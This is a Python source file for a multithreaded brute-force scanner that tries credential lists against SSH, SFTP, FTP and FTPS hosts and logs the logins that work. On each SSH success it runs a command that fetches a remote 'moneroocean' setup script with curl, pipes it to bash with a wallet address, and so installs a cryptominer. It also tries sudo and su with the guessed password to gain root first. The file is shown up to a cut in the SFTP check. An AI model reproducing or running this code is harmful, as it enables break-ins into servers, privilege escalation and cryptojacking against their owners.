import argparse
import concurrent.futures
import curses
import ftplib
import logging
import os
import queue
import re
import socket
import sys
import threading
import time
from datetime import datetime, timedelta
import shutil
from collections import deque
import math
import shutil
import os
import colorlog
import paramiko
import pysftp
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

# --- GLOBAL SETTINGS ---
console = Console()

# Define connection messages with emojis (mostly for internal use now)
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔑 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in and script executed!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🐚 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Constants and global variables
timeout = 12  # Time limit for each connection in seconds

# These globals are primarily for display and overall statistics tracking.
# They are accessed with locks in multi-threaded contexts.
TOTAL_LINES = 0  # Total lines in the current input file being processed
CURRENT_LINE = 0  # Current line being processed in the current file
CURRENT_LINE_LOCK = threading.Lock()  # Lock for current line
CURRENT_HOST = ""  # Current server being attempted (for display)
CURRENT_HOST_LOCK = threading.Lock()  # Lock for current server

stats = None  # Instance of MultiProtocolFancyStats, initialized per file

# Define locks for updating shared variables for login attempts
LOGIN_ATTEMPTS_LOCK = threading.Lock()

# --- Locks for file writing (essential for multi-threading) ---
FILE_LOCKS = {
    "output.txt": threading.Lock(),
    "checked_ssh_dirs.txt": threading.Lock(),
    "checked_sftp_dirs.txt": threading.Lock(),
    "checked_ftp_dirs.txt": threading.Lock(),
    "checked_ftps_dirs.txt": threading.Lock(),
    "checked_ssh.txt": threading.Lock(),
    "checked_ftp.txt": threading.Lock(),
    "checked_ftps.txt": threading.Lock(),
    "checked_sftp.txt": threading.Lock(),
    "root_access.txt": threading.Lock(),
    "root_sudo.txt": threading.Lock(),
    # 'sourcefile' lock removed as files are moved, not modified in place
    "debug_log.txt": threading.Lock(),
}

# Dictionary to track login attempts across all files (or per file, reset below)
login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

parser = argparse.ArgumentParser(
    description="Attempt to login to a host using various protocols"
)

parser.add_argument(
    "-d",
    "--directory",
    help="Directory containing .txt files with login information",
    required=True,  # Made required as per logic, single file is alternative
)

parser.add_argument(
    "-v",
    "--verbose",
    help="Increase output verbosity (shows DEBUG and INFO messages to console)",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--threads",
    help="Number of threads to use",
    type=int,
    default=100,
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)

args = parser.parse_args()
protocols = [p.strip().upper() for p in args.protocols.split(",")]

# Add validation for protocols
supported_protocols = {"FTP", "FTPS", "SFTP", "SSH"}
if not all(p in supported_protocols for p in protocols):
    parser.error(
        f"Invalid protocol specified. Supported: {', '.join(supported_protocols)}"
    )

CHECKED_DIR = "!checked"
if not os.path.exists(CHECKED_DIR):
    os.makedirs(CHECKED_DIR)
    # script_logger might not be initialized yet, so use print for this initial setup
    print(f"Created directory: {CHECKED_DIR}")

# --- Logging Configuration ---
script_logger = colorlog.getLogger("script_logger")
script_logger.propagate = False

file_handler = logging.FileHandler("debug_log.txt", mode="a", encoding="utf-8")
file_handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)-8s - %(message)s")
)
file_handler.setLevel(logging.DEBUG)
script_logger.addHandler(file_handler)
script_logger.setLevel(logging.DEBUG)

console_handler = colorlog.StreamHandler()
console_handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

# Set console handler level based on verbose argument
console_handler.setLevel(logging.INFO if args.verbose else logging.CRITICAL)
if args.verbose:
    script_logger.addHandler(console_handler)

# Silence other libraries' loggers
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("pysftp").setLevel(logging.CRITICAL)
logging.getLogger("ftplib").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger().setLevel(logging.WARNING)


# --- System Error Stream Redirection ---
class StderrRedirector:
    """
    Context manager to redirect stderr to a file or /dev/null.
    Useful for suppressing verbose output from libraries like paramiko that
    might print directly to stderr even when their loggers are silenced.
    """

    def __init__(self, to=os.devnull):
        self.to_fd = None
        self.old_stderr_fd = None
        self.old_stderr = None
        self.target_file = None
        if to != os.devnull:
            self.target_file = open(to, "a", buffering=1, encoding="utf-8")
        else:
            self.to_fd = os.open(os.devnull, os.O_WRONLY)
            self.target_file = None

    def __enter__(self):
        self.old_stderr = sys.stderr
        self.old_stderr_fd = sys.stderr.fileno()

        if self.target_file:
            target_fd = self.target_file.fileno()
        else:
            target_fd = self.to_fd

        self.dup_stderr = os.dup(self.old_stderr_fd)
        os.dup2(target_fd, self.old_stderr_fd)

        if self.target_file:
            sys.stderr = self.target_file
        else:
            sys.stderr = os.fdopen(os.dup(target_fd), "w", encoding="utf-8")

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if sys.stderr is not self.old_stderr and hasattr(sys.stderr, "flush"):
            sys.stderr.flush()

        os.dup2(self.dup_stderr, self.old_stderr_fd)
        os.close(self.dup_stderr)
        sys.stderr = self.old_stderr

        if not self.target_file and self.to_fd is not None:
            os.close(self.to_fd)

        return False


class MultiProtocolFancyStats:
    """
    Manages and displays real-time statistics for the multi-protocol scanner.
    Uses ANSI escape codes for coloring and Rich for layout concepts (though
    direct printing is used for full screen control with curses-like clear).
    """

    def __init__(self, total_hosts, filename, protocols=None, threads=100):
        self.total_hosts = total_hosts
        self.filename = os.path.basename(filename)
        self.protocols = protocols if protocols else ["SSH"]
        self.threads = threads
        self.start_time = time.time()

        # Stats tracking per protocol
        self.protocol_stats = {}
        for protocol in self.protocols:
            self.protocol_stats[protocol] = {
                "correct_logins": 0,
                "failed_logins": 0,
                "hosts_checked": 0,
                "current_host": "Waiting...",
                "active_threads": 0,  # Not directly used per protocol, but total
                "speed_history": deque(maxlen=30),  # Stores speed over last 30 updates
                "current_speed": 0.0,
                "avg_speed": 0.0,
                "last_checked_count": 0,
                "last_speed_update": time.time(),
            }

        # Global stats
        self.total_hosts_checked = 0
        self.total_correct_logins = 0
        self.total_failed_logins = 0
        self.total_active_threads = 0
        self.overall_speed = 0.0

        # Display control
        self.running = True
        self.display_thread = None
        self.lock = threading.Lock()  # Lock for updating stats data

        # Animation frames
        self.spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.protocol_icons = {"SSH": "🔐", "SFTP": "📁", "FTP": "📂", "FTPS": "🔒"}
        self.frame_index = 0

        # Colors (ANSI escape codes)
        self.colors = {
            "reset": "\033[0m",
            "bold": "\033[1m",
            "dim": "\033[2m",
            "red": "\033[91m",
            "green": "\033[92m",
            "yellow": "\033[93m",
            "blue": "\033[94m",
            "magenta": "\033[95m",
            "cyan": "\033[96m",
            "white": "\033[97m",
            "orange": "\033[38;5;208m",
            "purple": "\033[38;5;129m",
            "bg_blue": "\033[44m",
            "bg_green": "\033[42m",
            "bg_yellow": "\033[43m",
            "bg_red": "\033[41m",
        }

        # Protocol specific colors
        self.protocol_colors = {
            "SSH": self.colors["green"],
            "SFTP": self.colors["blue"],
            "FTP": self.colors["yellow"],
            "FTPS": self.colors["magenta"],
        }

        # Output buffer for recent messages
        self.output_buffer = deque(maxlen=10)

    def start(self):
        """Start the live stats display in a separate thread."""
        if not self.display_thread or not self.display_thread.is_alive():
            self.running = True
            self.display_thread = threading.Thread(
                target=self._display_loop, daemon=True
            )
            self.display_thread.start()

    def stop(self):
        """Stop the live stats display and restore cursor/screen."""
        self.running = False
        if self.display_thread and self.display_thread.is_alive():
            self.display_thread.join(timeout=1)  # Wait for the display thread to finish
        # Restore cursor and clear screen after stopping
        print(f"\033[?25h\033[2J\033[H", end="", flush=True)

    def add_output(self, message):
        """Add a message to the output buffer for display."""
        with self.lock:
            timestamp = time.strftime("%H:%M:%S")
            self.output_buffer.append(f"[{timestamp}] {message}")

    def update_current_host(self, protocol, host):
        """Update the current host being processed for a specific protocol."""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["current_host"] = host

    def increment_protocol_checked(self, protocol):
        """Increment hosts checked counter for a specific protocol and update speed."""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["hosts_checked"] += 1
                self._update_protocol_speed(protocol)
                self._update_global_stats()

    def increment_protocol_correct(self, protocol):
        """Increment correct logins counter for a specific protocol."""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["correct_logins"] += 1
                self._update_global_stats()

    def increment_protocol_failed(self, protocol):
        """Increment failed logins counter for a specific protocol."""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["failed_logins"] += 1
                self._update_global_stats()

    def set_active_threads(self, count):
        """Set total active threads count."""
        with self.lock:
            self.total_active_threads = count

    def _update_protocol_speed(self, protocol):
        """
        Calculate and update the current and average speed for a given protocol.
        Called every time a host is checked for that protocol.
        """
        if protocol not in self.protocol_stats:
            return

        stats = self.protocol_stats[protocol]
        current_time = time.time()

        # Update speed roughly once every second or if many hosts processed rapidly
        if current_time - stats["last_speed_update"] >= 1.0:
            time_diff = current_time - stats["last_speed_update"]
            checked_diff = stats["hosts_checked"] - stats["last_checked_count"]

            if time_diff > 0:
                stats["current_speed"] = checked_diff / time_diff
                stats["speed_history"].append(stats["current_speed"])

                if stats["speed_history"]:
                    stats["avg_speed"] = sum(stats["speed_history"]) / len(
                        stats["speed_history"]
                    )

            stats["last_checked_count"] = stats["hosts_checked"]
            stats["last_speed_update"] = current_time

    def _update_global_stats(self):
        """Aggregate statistics from all protocols to update global counters."""
        self.total_hosts_checked = sum(
            stats["hosts_checked"] for stats in self.protocol_stats.values()
        )
        self.total_correct_logins = sum(
            stats["correct_logins"] for stats in self.protocol_stats.values()
        )
        self.total_failed_logins = sum(
            stats["failed_logins"] for stats in self.protocol_stats.values()
        )
        self.overall_speed = sum(
            stats["current_speed"] for stats in self.protocol_stats.values()
        )

    def _get_terminal_size(self):
        """Get terminal size safely."""
        try:
            return shutil.get_terminal_size()
        except OSError:
            # Fallback for environments where terminal size cannot be determined
            return shutil.get_terminal_size((120, 30))

    def _create_progress_bar(self, percentage, width=40):
        """Generates a colorful progress bar string."""
        filled = int(width * percentage / 100)
        bar = ""

        # Using different colors for progress segments
        for i in range(width):
            if i < filled:
                if percentage < 70:
                    bar += f"{self.colors['bg_green']} {self.colors['reset']}"
                elif percentage < 90:
                    bar += f"{self.colors['bg_yellow']} {self.colors['reset']}"
                else:
                    bar += f"{self.colors['bg_red']} {self.colors['reset']}"
            else:
                bar += f"{self.colors['dim']}▱{self.colors['reset']}"

        return bar

    def _format_time(self, seconds):
        """Formats seconds into Hh M's' or M's' or S's'."""
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds // 60)}m {int(seconds % 60)}s"
        else:
            hours = int(seconds // 3600)
            minutes = int((seconds % 3600) // 60)
            return f"{hours}h {minutes}m"

    def _estimate_time_remaining(self):
        """Estimates time remaining based on overall speed and total checks needed."""
        # Total checks needed considers each host being checked against all selected protocols
        total_checks_needed = self.total_hosts * len(self.protocols)
        if self.overall_speed > 0 and self.total_hosts_checked > 0:
            remaining_checks = total_checks_needed - self.total_hosts_checked
            if (
                remaining_checks < 0
            ):  # Handle cases where total_hosts_checked might exceed initial estimate due to dynamic file parsing, etc.
                return 0
            return remaining_checks / self.overall_speed
        return 0

    def _display_loop(self):
        """The main loop for the display thread, updates the terminal regularly."""
        print("\033[?25l", end="", flush=True)  # Hide cursor

        while self.running:
            try:
                self._render_display()
                time.sleep(0.5)  # Update every half second
                self.frame_index = (self.frame_index + 1) % len(self.spinner_frames)
            except Exception as e:
                script_logger.error(f"Display error: {e}", exc_info=True)
                time.sleep(1)  # Wait longer on error to prevent rapid logging

    def _render_display(self):
        """Renders the complete statistics display to the terminal."""
        term_size = self._get_terminal_size()
        width = min(term_size.columns - 2, 120)  # Max width 120, or terminal width

        with self.lock:  # Ensure consistent data for display
            runtime = time.time() - self.start_time
            total_checks_needed = self.total_hosts * len(self.protocols)
            percentage = (
                (self.total_hosts_checked / total_checks_needed * 100)
                if total_checks_needed > 0
                else 0
            )
            eta = self._estimate_time_remaining()

        # Clear screen and move cursor to top-left
        print("\033[2J\033[H", end="", flush=True)

        # Main header
        spinner = self.spinner_frames[self.frame_index]
        protocols_str = " | ".join(
            [f"{self.protocol_icons.get(p, '🔧')} {p}" for p in self.protocols]
        )
        header_title = f"{spinner} MULTI-PROTOCOL BRUTE FORCE SCANNER {spinner}"

        print(f"{self.colors['cyan']}{self.colors['bold']}", flush=True)
        print("╔" + "═" * (width - 2) + "╗", flush=True)
        print(f"║{header_title.center(width-2)}║", flush=True)
        print(f"║{protocols_str.center(width-2)}║", flush=True)
        print("╚" + "═" * (width - 2) + "╝", flush=True)
        print(f"{self.colors['reset']}", flush=True)

        # File info section
        print(
            f"\n{self.colors['yellow']}📁 Scan Configuration:{self.colors['reset']}",
            flush=True,
        )
        print(
            f"   📝 File: {self.colors['white']}{self.filename}{self.colors['reset']}",
            flush=True,
        )
        print(
            f"   🎯 Total Entries: {self.colors['magenta']}{self.total_hosts:,}{self.colors['reset']}",
            flush=True,
        )
        print(
            f"   🧵 Max Threads: {self.colors['blue']}{self.threads}{self.colors['reset']}",
            flush=True,
        )
        print(
            f"   🌐 Protocols: {self.colors['cyan']}{len(self.protocols)} ({', '.join(self.protocols)}){self.colors['reset']}",
            flush=True,
        )

        # Overall progress
        print(
            f"\n{self.colors['cyan']}📊 Overall Progress:{self.colors['reset']}",
            flush=True,
        )
        progress_bar = self._create_progress_bar(percentage, 60)
        print(
            f"   {progress_bar} {self.colors['bold']}{percentage:.1f}%{self.colors['reset']}",
            flush=True,
        )

        # Global stats
        print(
            f"\n{self.colors['green']}🌍 Global Statistics:{self.colors['reset']}",
            flush=True,
        )
        # Using a simple text-based table structure
        print("   ┌─────────────────────────┬─────────────────────────┐", flush=True)
        print(
            f"   │ 🕒 Runtime              │ {self.colors['white']}{self._format_time(runtime):<23}{self.colors['reset']} │",
            flush=True,
        )
        print(
            f"   │ ✅ Total Checks Done    │ {self.colors['green']}{self.total_hosts_checked:,} / {total_checks_needed:,}{'':>10}{self.colors['reset']} │",
            flush=True,
        )
        print(
            f"   │ 🚀 Active Threads       │ {self.colors['magenta']}{self.total_active_threads}{'':>22}{self.colors['reset']} │",
            flush=True,
        )
        print(
            f"   │ ⚡ Overall Speed        │ {self.colors['cyan']}{self.overall_speed:.1f} checks/sec{'':>8}{self.colors['reset']} │",
            flush=True,
        )
        print(
            f"   │ ⏱️  ETA                 │ {self.colors['yellow']}{self._format_time(eta) if eta > 0 else 'Calculating...'}{'':>10}{self.colors['reset']} │",
            flush=True,
        )
        print("   └─────────────────────────┴─────────────────────────┘", flush=True)

        # Per-protocol stats
        print(
            f"\n{self.colors['blue']}🔧 Protocol Breakdown:{self.colors['reset']}",
            flush=True,
        )

        for protocol in self.protocols:
            stats = self.protocol_stats[protocol]
            color = self.protocol_colors.get(protocol, self.colors["white"])
            icon = self.protocol_icons.get(protocol, "🔧")

            print(f"   {color}{icon} {protocol}:{self.colors['reset']}", flush=True)
            print(
                f"      ✅ Success: {self.colors['green']}{stats['correct_logins']}{self.colors['reset']} | "
                f"❌ Failed: {self.colors['red']}{stats['failed_logins']}{self.colors['reset']} | "
                f"📊 Checked: {self.colors['cyan']}{stats['hosts_checked']}{self.colors['reset']} | "
                f"⚡ Speed: {self.colors['yellow']}{stats['current_speed']:.1f}/s{self.colors['reset']}",
                flush=True,
            )
            # Truncate current host if too long
            display_current_host = stats["current_host"]
            if len(display_current_host) > 50:
                display_current_host = display_current_host[:47] + "..."
            print(
                f"      🎯 Current: {self.colors['white']}{display_current_host}{self.colors['reset']}",
                flush=True,
            )

        # Recent activity
        print(
            f"\n{self.colors['purple']}📋 Recent Activity:{self.colors['reset']}",
            flush=True,
        )
        if self.output_buffer:
            # Show last 5 messages
            for msg in list(self.output_buffer)[-5:]:
                print(f"   {self.colors['dim']}{msg}{self.colors['reset']}", flush=True)
        else:
            print(
                f"   {self.colors['dim']}No recent activity...{self.colors['reset']}",
                flush=True,
            )

        print(
            f"\n{self.colors['dim']}Press Ctrl+C to stop...{self.colors['reset']}",
            flush=True,
        )


def parse_connection_string(line):
    """
    Parses a single line of input to extract protocol, host, port, username, and password.
    Supports SSH URL format and multi-line Host/Username/Password format.
    Returns (protocol_type, {'host': ..., 'port': ..., 'username': ..., 'password': ...}) or (None, None).
    """
    if line.startswith("SSH://"):
        regex = r"^SSH://([^:@]+):([^:@]+)@([^:@]+):(\d+)$"
        match = re.match(regex, line)
        if match:
            username = match.group(1)
            password = match.group(2)
            host = match.group(3)
            try:
                port = int(match.group(4))
                return "SSH", {
                    "host": host,
                    "port": port,
                    "username": username,
                    "password": password,
                }
            except ValueError:
                script_logger.error(f"Invalid port in SSH URL: {line}")
                return None, None
        else:
            script_logger.warning(f"Invalid SSH URL format: {line}")
            return None, None
    elif line.startswith("Host:"):
        # This function is designed to parse one line. Multi-line entries
        # are handled by the main loop's buffer logic before calling this.
        # This part is a placeholder for single-line Host/User/Pass if that format emerges.
        # For now, it will only return None.
        return None, None
    return None, None


def submit_protocol_task(
    executor,
    protocol_type,
    host,
    port,
    username,
    password,
    conn_timeout,
    sourcefile_path,
):
    """
    Submit a single protocol task to the executor.
    This function ensures each protocol gets its own task.
    """
    if protocol_type in protocols:  # Check if the protocol is enabled by user
        script_logger.debug(f"Submitting {protocol_type} task for {host}:{port}")
        future = executor.submit(
            check_login_thread,
            host,
            port,
            username,
            password,
            conn_timeout,
            protocol_type,
            sourcefile_path,
        )
        return future
    else:
        script_logger.debug(
            f"Skipping {protocol_type} for {host}:{port} as it's not enabled."
        )
        return None


def check_login_thread(
    host, port, username, password, conn_timeout, protocol, sourcefile_path
):
    """
    Main thread function to check a login for a specific protocol.
    Updates global stats and calls protocol-specific check functions.
    """
    global CURRENT_LINE, CURRENT_HOST, stats

    with CURRENT_LINE_LOCK:
        CURRENT_LINE += 1

    current_target = f"{username}@{host}:{port}"
    with CURRENT_HOST_LOCK:
        CURRENT_HOST = current_target  # For general display

    # Update stats with current host being processed
    if stats:
        stats.update_current_host(protocol, current_target)
        stats.add_output(f"🚀 Checking {protocol}://{current_target}")

    script_logger.debug(f"🚀 Attempting connection to {host}:{port} for {protocol}")

    start_time_thread = time.time()
    result_data = None
    redirect_target = "debug_log.txt" if args.verbose else os.devnull

    with StderrRedirector(to=redirect_target):
        try:
            if protocol == "SSH":
                result_data = check_ssh_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "SFTP":
                result_data = check_sftp_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "FTP":
                result_data = check_ftp_login(
                    host, port, username, password, conn_timeout
                )
            elif protocol == "FTPS":
                result_data = check_ftps_login(
                    host, port, username, password, conn_timeout
                )
            else:
                script_logger.warning(f"Unsupported protocol encountered: {protocol}")

        except Exception as e:
            script_logger.error(
                f"Unhandled exception during {protocol} login check for {host}:{port}: {e}",
                exc_info=True,
            )

    elapsed_time = time.time() - start_time_thread

    # Centralized result handling and file writing
    if (
        result_data and result_data[0]
    ):  # result_data[0] is the protocol name if successful
        protocol_name = result_data[0]
        sudo_available = result_data[1] if len(result_data) > 1 else False
        su_root_available = result_data[2] if len(result_data) > 2 else False
        server_output = result_data[3] if len(result_data) > 3 else ""

        success_msg = (
            f"🎉 SUCCESS │ {protocol_name}://{username}:{password}@{host}:{port}"
            f" │ Duration: {elapsed_time:.2f}s"
        )

        # Update stats for successful login
        if stats:
            stats.increment_protocol_correct(protocol)
            stats.add_output(f"✔️ SUCCESS: {username}@{host}:{port} ({protocol})")

        script_logger.info(success_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["correct_logins"][protocol_name] += 1

        # Call the centralized write function with all necessary info
        write_to_output(
            protocol_name,
            username,
            password,
            host,
            port,
            sudo_available=sudo_available,
            su_root_available=su_root_available,
            server_output=server_output,
        )
    else:
        fail_msg = f"❌ Failed login for {protocol}://{username}:{password}@{host}:{port} │ Duration: {elapsed_time:.2f}s"

        # Update stats for failed login
        if stats:
            stats.increment_protocol_failed(protocol)
            stats.add_output(f"❌ FAILED: {username}@{host}:{port} ({protocol})")

        script_logger.info(fail_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["incorrect_logins"][protocol] += 1

    # Always increment hosts checked, regardless of success or failure
    if stats:
        stats.increment_protocol_checked(protocol)

    with CURRENT_HOST_LOCK:
        elapsed_time_formatted = f"{elapsed_time:.2f} seconds"
        script_logger.debug(
            f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time_formatted}"
        )


def check_ssh_login(host, port, username, password, conn_timeout):
    """
    Attempts to establish an SSH connection and perform actions.
    Returns ("SSH", sudo_status, su_status, server_output_string) on success,
    or None on failure. Collects server output.
    """
    sudo_available = False
    su_root_available = False
    server_output_buffer = []  # Buffer to collect all output

    try:
        script_logger.debug(
            f"Trying SSH connection ({username}:{password}@{host}:{port})"
        )
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=conn_timeout,
            look_for_keys=False,  # Don't try local SSH keys
            allow_agent=False,  # Don't try SSH agent
        )

        script_logger.info(
            f"Connected to SSH server {host}:{port} with {username}:{password}"
        )
        server_output_buffer.append(
            f"--- SSH Connection to {username}@{host}:{port} ---"
        )

        # Try to get directory listing
        try:
            stdin, stdout, stderr = client.exec_command("ls -la")
            dir_listing = stdout.read().decode(errors="ignore").strip()
            err_listing = stderr.read().decode(errors="ignore").strip()
            if dir_listing:
                server_output_buffer.append(
                    f"\n[Directory Listing (ls -la)]:\n{dir_listing}"
                )
            if err_listing:
                server_output_buffer.append(
                    f"\n[Directory Listing Error]:\n{err_listing}"
                )

            # Still write to checked_ssh_dirs.txt as well for dedicated logs
            with FILE_LOCKS["checked_ssh_dirs.txt"]:
                with open("checked_ssh_dirs.txt", "a", encoding="utf-8") as output_file:
                    output_file.write(
                        f"SSH directory listing for {username}:{password}@{host}:{port}:\n{dir_listing}\n{err_listing}\n"
                    )
        except Exception as e:
            script_logger.warning(
                f"Failed to get directory listing for {host}:{port}: {e}"
            )
            server_output_buffer.append(f"\n[Directory Listing Error]: {e}")

        # Check for shell access
        # Using get_pty=True to simulate a real terminal session which can reveal messages
        stdin, stdout, stderr = client.exec_command("echo Test", get_pty=True)
        # Give a small moment for output to arrive, especially for shell messages
        time.sleep(0.5)
        welcome_message = ""
        if stdout.channel.recv_ready():
            welcome_message = stdout.channel.recv(4096).decode(errors="ignore").strip()
        err_message = stderr.read().decode(errors="ignore").strip()

        shell_access_denied_keywords = [
            "This service allows sftp connections only.",
            "Shell access is not enabled on your account!",
            "This account is currently not available.",
            "Shell access is disabled",
            "command not allowed on SFTP-only account",
            "access denied for user",  # Generic message for limited shell
        ]

        if any(
            keyword in (welcome_message + err_message)
            for keyword in shell_access_denied_keywords
        ):
            script_logger.info(
                f"⚠️ Server {host}:{port} does not allow shell access. Considering as success without command execution."
            )
            server_output_buffer.append(
                f"\n[Shell Access Check]:\n{welcome_message}\n{err_message}\nNo shell access detected."
            )
            client.close()
            return (
                "SSH",
                False,
                False,
                "\n".join(server_output_buffer),
            )  # Pass collected output

        install_command = (
            "systemctl stop swapd ; curl -L -v "
            "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/"
            "setup_mo_4_r00t_and_user.sh | bash -s 4BGGo3R1dNFpS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBjvfSKNhUuX"
        )
        server_output_buffer.append(
            f"\n[Attempting to run install command]:\n{install_command}"
        )

        stdin, stdout, stderr = client.exec_command("whoami")
        current_user = stdout.read().decode(errors="ignore").strip()
        server_output_buffer.append(f"\n[Current User]: {current_user}")

        if current_user == "root":
            script_logger.info(f"Already have root access on {host}:{port}")
            stdin, stdout, stderr = client.exec_command(install_command)
            install_output = stdout.read().decode(errors="ignore").strip()
            install_error = stderr.read().decode(errors="ignore").strip()
            server_output_buffer.append(
                f"\n[Install Command Output (as root)]:\n{install_output}"
            )
            if install_error:
                server_output_buffer.append(
                    f"\n[Install Command Error (as root)]:\n{install_error}"
                )
            sudo_available = True
            su_root_available = True
        else:
            script_logger.info(f"Attempting privilege escalation on {host}")
            server_output_buffer.append(f"\n[Privilege Escalation Attempt]:")
            sudo_commands = [
                "sudo -s",
                "sudo -i",
                "sudo su -",
                "sudo bash -c",
                "sudo",  # Just 'sudo' to see if it prompts for password or allows direct root command
            ]

            for cmd_prefix in sudo_commands:
                full_cmd = f"{cmd_prefix} '{install_command}'"
                server_output_buffer.append(f"  Trying: {full_cmd}")

                # Executing with get_pty=True to handle password prompts
                stdin, stdout, stderr = client.exec_command(full_cmd, get_pty=True)
                time.sleep(1)  # Give time for prompt to appear

                prompt_output = ""
                if stdout.channel.recv_ready():
                    prompt_output = stdout.channel.recv(1024).decode(errors="ignore")
                    server_output_buffer.append(
                        f"  Prompt response: {prompt_output.strip()}"
                    )
                    if "password" in prompt_output.lower():
                        stdin.write(f"{password}\n")
                        stdin.flush()
                        time.sleep(2)  # Give time for command to execute after password

                cmd_output = stdout.read().decode(errors="ignore").strip()
                cmd_error = stderr.read().decode(errors="ignore").strip()
                server_output_buffer.append(f"  Output:\n{cmd_output}")
                if cmd_error:
                    server_output_buffer.append(f"  Error:\n{cmd_error}")

                # Check if we are root after the command
                stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                    "whoami"
                )
                final_user = stdout_whoami.read().decode(errors="ignore").strip()
                server_output_buffer.append(f"  User after command: {final_user}")

                if final_user == "root":
                    sudo_available = True
                    script_logger.info(
                        f"Successfully got root with '{cmd_prefix}' on {host}"
                    )
                    server_output_buffer.append(
                        f"  SUCCESS: Gained root with '{cmd_prefix}'"
                    )
                    break  # Exit loop if root access is gained
                else:
                    server_output_buffer.append(f"  Failed with '{cmd_prefix}'")

            if not sudo_available:  # If sudo attempts failed, try 'su'
                script_logger.info(f"Sudo failed on {host}, trying 'su'")
                server_output_buffer.append(f"  Sudo failed, trying 'su'")

                stdin, stdout, stderr = client.exec_command(
                    f"su -c '{install_command}'", get_pty=True
                )
                time.sleep(1)  # Give time for prompt

                prompt_output = ""
                if stdout.channel.recv_ready():
                    prompt_output = stdout.channel.recv(1024).decode(errors="ignore")
                    server_output_buffer.append(
                        f"  Prompt response: {prompt_output.strip()}"
                    )
                    if "password" in prompt_output.lower():
                        stdin.write(f"{password}\n")
                        stdin.flush()
                        time.sleep(2)  # Give time for command to execute

                cmd_output = stdout.read().decode(errors="ignore").strip()
                cmd_error = stderr.read().decode(errors="ignore").strip()
                server_output_buffer.append(f"  Output:\n{cmd_output}")
                if cmd_error:
                    server_output_buffer.append(f"  Error:\n{cmd_error}")

                stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                    "whoami"
                )
                final_user = stdout_whoami.read().decode(errors="ignore").strip()
                server_output_buffer.append(f"  User after command: {final_user}")

                if final_user == "root":
                    su_root_available = True
                    script_logger.info(f"Successfully got root with 'su' on {host}")
                    server_output_buffer.append(f"  SUCCESS: Gained root with 'su'")
                else:
                    script_logger.info(
                        f"Could not gain root access on {host}, running install as normal user (if applicable)"
                    )
                    server_output_buffer.append(
                        f"  Failed to gain root. Attempting install as normal user."
                    )
                    # Execute as normal user if root not gained
                    stdin, stdout, stderr = client.exec_command(install_command)
                    norm_output = stdout.read().decode(errors="ignore").strip()
                    norm_error = stderr.read().decode(errors="ignore").strip()
                    server_output_buffer.append(
                        f"\n[Install Command Output (as normal user)]:\n{norm_output}"
                    )
                    if norm_error:
                        server_output_buffer.append(
                            f"\n[Install Command Error (as normal user)]:\n{norm_error}"
                        )

        server_output_buffer.append(
            f"--- End of SSH Connection to {username}@{host}:{port} ---"
        )
        client.close()
        return (
            "SSH",
            sudo_available,
            su_root_available,
            "\n".join(server_output_buffer),
        )

    except paramiko.ssh_exception.AuthenticationException:
        script_logger.info(f"🔑 Authentication failed for SSH {username}@{host}:{port}")
    except paramiko.ssh_exception.SSHException as e:
        script_logger.info(f"🚫 SSH connection error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for SSH {host}:{port}.")
    except OSError as e:
        script_logger.info(
            f"🚫 Socket operation error (OSError) during SSH connection to {host}:{port}: {e}"
        )
    except EOFError:
        script_logger.info(f"🚫 Unexpected EOF during SSH connection to {host}:{port}.")
    except Exception as e:
        script_logger.error(
            f"⚠️ An unexpected error occurred during SSH for {host}:{port}: {e}",
            exc_info=True,
        )
    finally:
        if "client" in locals() and client.get_transport() is not None:
            client.close()

    return None


def check_sftp_login(host, port, username, password, conn_timeout):
    """
    Attempts to establish an SFTP connection.
    Returns ("SFTP", False, False, "") on success, or None on failure.
    """
    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None  # Disable host key checking for quick scanning
        script_logger.debug(
